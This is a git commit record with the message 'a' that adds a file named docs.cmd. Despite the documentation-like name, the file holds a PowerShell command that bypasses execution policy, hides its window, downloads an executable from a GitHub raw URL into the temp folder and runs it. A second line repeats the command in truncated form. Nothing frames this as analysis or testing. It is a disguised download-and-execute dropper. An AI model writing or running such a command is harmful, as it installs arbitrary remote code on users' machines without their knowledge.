b9059fe301305786cadf9240cd2d8d145ecba226
cres20 <34353305+cres20@users.noreply.github.com>
2017-12-08 05:42:03 +0200

    a
    a

---
+++ docs.cmd
@@ -0,0 +1,2 @@
+PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('http://github.com/cres20/1/raw/master/teeest3.exe','%TEMP%\Test.exe');Start-Process '%TEMP%\Test.exe'
+-ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile
